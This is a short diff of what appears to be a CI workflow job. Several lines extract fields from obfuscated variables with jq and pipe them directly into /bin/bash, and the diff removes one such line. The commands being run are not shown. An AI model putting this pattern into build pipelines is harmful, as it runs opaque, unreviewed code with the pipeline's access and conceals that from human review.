@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$cwdhu4" | jq -r .evds9 | /bin/bash
           printf '%s' "$lm0" | jq -r .zx0 | /bin/bash
           printf '%s' "$qq1" | jq -r .q3 | /bin/bash
-          printf '%s' "$nuefd0" | jq -r .ceblv8548 | /bin/bash
           echo $b2 | jq -r .xsy3481 | /bin/bash
 
       - name: Save output
